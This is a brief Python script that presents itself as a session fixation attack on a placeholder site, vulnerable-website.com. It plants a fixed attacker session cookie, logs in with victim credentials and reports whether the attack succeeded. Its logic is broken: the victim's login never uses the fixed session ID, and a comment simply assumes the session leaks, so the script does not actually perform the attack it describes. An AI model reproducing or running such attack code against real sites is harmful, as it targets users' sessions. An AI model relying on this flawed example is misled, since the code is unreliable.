import requests
from requests.cookies import RequestsCookieJar

# Target URL for login and session fixation
LOGIN_URL = 'http://vulnerable-website.com/login'
SESSION_FIXATION_URL = 'http://vulnerable-website.com/secure'

def create_session_id():
    # Simulate creating a session ID to use for fixation
    return "attacker-session-id"

def set_session_cookie(session_id):
    # Create a custom cookie jar with the attacker’s session ID
    jar = RequestsCookieJar()
    jar.set('sessionid', session_id, domain='vulnerable-website.com', path='/')
    return jar

def login_as_victim(username, password):
    # Simulate victim login
    payload = {'username': username, 'password': password}
    response = requests.post(LOGIN_URL, data=payload)
    return response.cookies

def perform_session_fixation_attack(victim_username, victim_password):
    # Create an attacker’s session ID
    session_id = create_session_id()
    # Set the session ID as a cookie
    attacker_cookies = set_session_cookie(session_id)
    
    # Login as victim
    victim_cookies = login_as_victim(victim_username, victim_password)
    # Assume that victim's session ID is leaked and now used by attacker
    if victim_cookies:
        response = requests.get(SESSION_FIXATION_URL, cookies=attacker_cookies)
        if "Welcome back" in response.text:
            print("Session fixation attack successful. Attacker has access.")
        else:
            print("Session fixation attack failed.")
    else:
        print("Victim login failed.")

perform_session_fixation_attack('victim_user', 'victim_password')
